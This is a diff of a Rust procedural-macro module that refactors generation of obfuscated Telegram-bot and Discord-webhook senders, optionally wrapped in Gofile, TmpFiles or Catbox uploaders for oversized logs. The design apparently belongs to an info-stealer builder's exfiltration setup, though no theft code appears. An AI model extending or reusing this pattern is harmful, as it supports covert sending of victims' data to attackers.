@@ -25,51 +25,12 @@
  */
 use proc_macro2::TokenStream;
 use quote::quote;
-use sender::discord_webhook::DiscordWebhookSender;
-use sender::telegram_bot::TelegramBotSender;
 use crate::send_settings::{SendSettings, UploaderService, UploaderUsecase};
 use crate::sender_service::SenderService;
+use crate::ToExpr;
 
-fn gen_base_sender(service: SenderService) -> TokenStream {
-    match service {
-        SenderService::TelegramBot(TelegramBotSender { token, chat_id }) => {
-            let token = &*token;
-            let chat_id = &*chat_id;
-
-            quote! {
-                sender::telegram_bot::TelegramBotSender::new(
-                    obfstr::obfstr!(#token),
-                    obfstr::obfstr!(#chat_id),
-                )
-            }
-        },
-        SenderService::DiscordWebhook(DiscordWebhookSender { webhook }) => {
-            let webhook = &*webhook;
-            quote! {
-                sender::discord_webhook::DiscordWebhookSender::new(
-                    obfstr::obfstr!(#webhook),
-                )
-            }
-        }
-    }
-}
-
-fn gen_uploader_wrapper(uploader: UploaderService, base: TokenStream) -> TokenStream {
-    match uploader {
-        UploaderService::Gofile => quote! {
-            sender::gofile::GofileUploader::new(#base)
-        },
-        UploaderService::TmpFiles => quote! {
-            sender::tmpfiles::TmpFilesUploader::new(#base)
-        },
-        UploaderService::Catbox => quote! {
-            sender::catbox::CatboxUploader::new(#base)
-        }
-    }
-}
-
-impl SendSettings {
-    pub fn gen_expr(&self) -> TokenStream {
+impl ToExpr for SendSettings {
+    fn to_expr(&self, _args: ()) -> TokenStream {
         let expr = self.expr_internal();
 
         quote! {
@@ -78,19 +39,24 @@ impl SendSettings {
             }
         }
     }
+}
 
+impl SendSettings {
     fn expr_internal(&self) -> TokenStream {
-        let base = gen_base_sender(self.service.clone());
+        let base = match self.service.clone() {
+            SenderService::TelegramBot(bot) => bot.to_expr(()),
+            SenderService::DiscordWebhook(webhook) => webhook.to_expr(())
+        };
 
         let Some((service, usecase)) = self.uploader.clone() else {
             return base
         };
 
         match usecase.clone() {
-            UploaderUsecase::Always => gen_uploader_wrapper(service, base),
+            UploaderUsecase::Always => service.to_expr((base,)),
             UploaderUsecase::WhenLogExceedsLimit => {
                 let sender_clone = quote! { sender.clone() };
-                let wrapper_tokens = gen_uploader_wrapper(service, sender_clone);
+                let wrapper_tokens = service.to_expr((sender_clone,));
 
                 quote! {
                     let sender = #base;
